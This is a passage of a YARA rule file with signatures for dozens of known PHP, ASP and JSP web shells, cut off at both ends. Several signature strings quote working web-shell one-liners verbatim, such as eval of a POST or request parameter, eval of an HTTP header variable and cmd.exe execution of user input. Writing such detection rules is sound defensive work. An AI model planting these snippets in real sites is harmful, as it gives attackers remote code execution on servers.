\"sb.append(l[i].getName() + \\\"/\\\\t\\\" + sT + \\\"\\\\t\\\" + l[i].length()+ \\\"\\\\t\\\" + sQ\" \n      $s10 = \"ResultSet r = s.indexOf(\\\"jdbc:oracle\\\")!=-1?c.getMetaData()\" \n      $s11 = \"return DriverManager.getConnection(x[1].trim()+\\\":\\\"+x[4],x[2].equalsIgnoreCase(\" \n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_PHP_RID315F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file PHP.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:19:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"<font color=blue>Error!</font>\\\";\" fullword\n      $s2 = \"<input type=\\\"text\\\" size=61 name=\\\"f\\\" value='<?php echo $_SERVER[\\\"SCRIPT_FILE\" \n      $s5 = \" - ExpDoor.com</title>\" fullword\n      $s10 = \"$f=fopen($_POST[\\\"f\\\"],\\\"w\\\");\" fullword\n      $s12 = \"<textarea name=\\\"c\\\" cols=60 rows=15></textarea><br>\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_webshells_new_Asp_RID319B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shells - generated from file Asp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-28 13:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Execute MorfiCoder(\\\")/*/z/*/(tseuqer lave\\\")\" fullword\n      $s2 = \"Function MorfiCoder(Code)\" fullword\n      $s3 = \"MorfiCoder=Replace(Replace(StrReverse(Code),\\\"/*/\\\",\\\"\\\"\\\"\\\"),\\\"\\\\*\\\\\\\",vbCrlf)\" fullword\n   condition: \n      1 of them\n}\n\nrule WEBSHELL_H4ntu_Shell_Powered_Tsoi_3_RID33B5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file h4ntu shell powered by tsoi.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"  <TD><DIV STYLE=\\\"font-family: verdana; font-size: 10px;\\\"><b>Server Adress:</b\" \n      $s3 = \"  <TD><DIV STYLE=\\\"font-family: verdana; font-size: 10px;\\\"><b>User Info:</b> ui\" \n      $s4 = \"    <TD><DIV STYLE=\\\"font-family: verdana; font-size: 10px;\\\"><?= $info ?>: <?= \" \n   condition: \n      2 of them\n}\n\nrule Webshell_PHP_sql_RID2D3D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file sql.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:23:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$result=mysql_list_tables($db) or die (\\\"$h_error<b>\\\".mysql_error().\\\"</b>$f_\" \n      $s4 = \"print \\\"<a href=\\\\\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_a_RID2C4E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file a.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:43:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"<option value=\\\\\\\"\\\". strrev(substr(strstr(strrev($work_dir), \\\"/\\\"\" \n      $s2 = \"echo \\\"<option value=\\\\\\\"$work_dir\\\\\\\" selected>Current Directory</option>\" \n      $s4 = \"<input name=\\\"submit_btn\\\" type=\\\"submit\\\" value=\\\"Execute Command\\\"></p> \" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_iMHaPFtp_2_RID2E10 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file iMHaPFtp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:58:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"if ($l) echo '<a href=\\\"' . $self . '?action=permission&amp;file=' . urlencode($\" \n      $s9 = \"return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Jspspyweb_RID2E6D : DEMO SCRIPT T1112 T1505_003 T1543_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Jspspyweb.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:14:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1112, T1505_003, T1543_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"      out.print(\\\"<tr><td width='60%'>\\\"+strCut(convertPath(list[i].getPath()),7\" \n      $s3 = \"  \\\"reg add \\\\\\\"HKEY_LOCAL_MACHINE\\\\\\\\SYSTEM\\\\\\\\CurrentControlSet\\\\\\\\Control\" \n   condition: \n      all of them\n}\n\nrule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_RID3866 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 18:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"die(\\\"\\\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\\\n\" \n      $s1 = \"Mode Shell v1.0</font></span></a></font><font face=\\\"Webdings\\\" size=\\\"6\\\" color\" \n   condition: \n      1 of them\n}\n\nrule Webshell_phpshell_2_1_pwhash_RID3211 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file pwhash.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:49:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<tt>&nbsp;</tt>\\\" (space), \\\"<tt>[</tt>\\\" (left bracket), \\\"<tt>|</tt>\\\" (pi\" \n      $s3 = \"word: \\\"<tt>null</tt>\\\", \\\"<tt>yes</tt>\\\", \\\"<tt>no</tt>\\\", \\\"<tt>true</tt>\\\",\" \n   condition: \n      1 of them\n}\n\nrule Webshell_PHPRemoteView_RID2F95 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PHPRemoteView.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<input type=submit value='\\\".mm(\\\"Delete all dir/files recursive\\\").\\\" (rm -fr)'\" \n      $s4 = \"<a href='$self?c=delete&c2=$c2&confirm=delete&d=\\\".urlencode($d).\\\"&f=\\\".u\" \n   condition: \n      1 of them\n}\n\nrule Webshell_caidao_shell_guo_RID3128 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file guo.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:10:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php ($www= $_POST['ice'])!\" \n      $s1 = \"@preg_replace('/ad/e','@'.str_rot13('riny').'($ww\" \n   condition: \n      1 of them\n}\n\nrule Webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend_RID3A73 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 19:47:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo\" \n      $s3 = \"fputs ($fp ,\\\"\\\\n*********************************************\\\\nWelcome T0 Sim\" \n   condition: \n      1 of them\n}\n\nrule Webshell_jsp_12302_RID2D4A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 12302.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"</font><%out.print(request.getRealPath(request.getServletPath())); %>\" fullword\n      $s1 = \"<%@page import=\\\"java.io.*,java.util.*,java.net.*\\\"%>\" fullword\n      $s4 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859-1\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_redcod_RID2E5E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file redcod.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:11:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw\" fullword\n      $s1 = \"HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_remview_fix_RID2F4B : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file remview_fix.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"<a href='$self?c=delete&c2=$c2&confirm=delete&d=\\\".urlencode($d).\\\"&f=\\\".u\" \n      $s5 = \"echo \\\"<P><hr size=1 noshade>\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\" \n   condition: \n      1 of them\n}\n\nrule Webshell_asp_cmd_RID2D7D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%= \\\"\\\\\\\\\\\" & oScriptNet.ComputerName & \\\"\\\\\\\" & oScriptNet.UserName %>\" fullword\n      $s1 = \"Set oFileSys = Server.CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword\n      $s3 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_php_sh_server_RID301E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file server.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:26:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(getenv('HTTP_CODE'));\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_PH_Vayv_PH_Vayv_RID303F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PH Vayv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"style=\\\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in\" \n      $s4 = \"<font color=\\\"#858585\\\">SHOPEN</font></a></font><font face=\\\"Verdana\\\" style\" \n   condition: \n      1 of them\n}\n\nrule Webshell_caidao_shell_ice_RID310E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ice.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:06:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%eval request(\\\"ice\\\")%>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_cihshell_fix_RID2F98 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cihshell_fix.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:03:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty\" \n      $s8 = \"if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos\" \n   condition: \n      1 of them\n}\n\nrule Webshell_asp_shell_RID2E61 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file shell.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:12:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<input type=\\\"submit\\\" name=\\\"Send\\\" value=\\\"GO!\\\">\" fullword\n      $s8 = \"<TEXTAREA NAME=\\\"1988\\\" ROWS=\\\"18\\\" COLS=\\\"78\\\"></TEXTAREA>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_Private_i3lue_RID2FC2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Private-i3lue.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:10:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"case 15: $image .= \\\"\\\\21\\\\0\\\\\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_up_RID2D32 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file up.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:21:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);\" fullword\n      $s3 = \"if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {\" fullword\n      $s8 = \"echo \\\"Uploaded file: \\\" . $HTTP_POST_FILES['userfile']['name'];\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_Mysql_interface_v1_0_RID3261 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Mysql interface v1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\\\\\"return\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_s_u_RID2D94 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file s-u.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:37:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"<a href=\\\"?act=do\\\"><font color=\\\"red\\\">Go Execute</font></a></b><br /><textarea\" \n   condition: \n      all of them\n}\n\nrule Webshell_phpshell_2_1_config_RID31FC : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file config.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:45:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"; (choose good passwords!).  Add uses as simple 'username = \\\"password\\\"' lines.\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_asp_EFSO_2_RID2E07 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file EFSO_2.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:57:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_up_RID2D37 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file up.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:22:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"// BUG: Corta el fichero si es mayor de 640Ks\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_NetworkFileManagerPHP_A_RID3353 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file NetworkFileManagerPHP.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:43:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"  echo \\\"<br><center>All the data in these tables:<br> \\\".$tblsv.\\\" were putted \" \n   condition: \n      all of them\n}\n\nrule Webshell_Server_Variables_RID3115 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Server Variables.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:07:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<% For Each Vars In Request.ServerVariables %>\" fullword\n      $s9 = \"Variable Name</B></font></p>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_caidao_shell_ice_2_RID319F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ice.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php ${${eval($_POST[ice])}};?>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_caidao_shell_mdb_RID3110 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file mdb.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:06:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<% execute request(\\\"ice\\\")%>a \" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_guige_RID2E63 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file guige.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:12:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(damapath!=null &&!damapath.equals(\\\"\\\")&&content!=null\" \n   condition: \n      all of them\n}\n\nrule Webshell_phpspy2010_RID2E0D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file phpspy2010.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"eval(gzinflate(base64_decode(\" \n      $s5 = \"//angel\" fullword\n      $s8 = \"$admin['cookiedomain'] = '';\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_asp_ice_RID2D7A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ice.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:33:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC\" \n   condition: \n      all of them\n}\n\nrule Webshell_drag_system_RID2F48 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file system.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:50:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"String sql = \\\"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_\" \n   condition: \n      all of them\n}\n\nrule Webshell_DarkBlade1_3_asp_indexx_RID3355 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file indexx.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:43:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"Const strs_toTransform=\\\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou\" \n   condition: \n      all of them\n}\n\nrule Webshell_phpshell3_RID2E39 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file phpshell3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:05:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<input name=\\\"nounce\\\" type=\\\"hidden\\\" value=\\\"<?php echo $_SESSION['nounce'];\" \n      $s5 = \"<p>Username: <input name=\\\"username\\\" type=\\\"text\\\" value=\\\"<?php echo $userna\" \n      $s7 = \"$_SESSION['output'] .= \\\"cd: could not change to: $new_dir\\\\n\\\";\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_jsp_hsxa_RID2E06 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file hsxa.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ page language=\\\"java\\\" pageEncoding=\\\"gbk\\\"%><jsp:directive.page import=\\\"ja\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_utils_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file utils.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ResultSet r = c.getMetaData().getTables(null, null, \\\"%\\\", t);\" fullword\n      $s4 = \"String cs = request.getParameter(\\\"z0\\\")==null?\\\"gbk\\\": request.getParameter(\\\"z\" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_01_RID2CAA : DEMO SCRIPT T1505_003 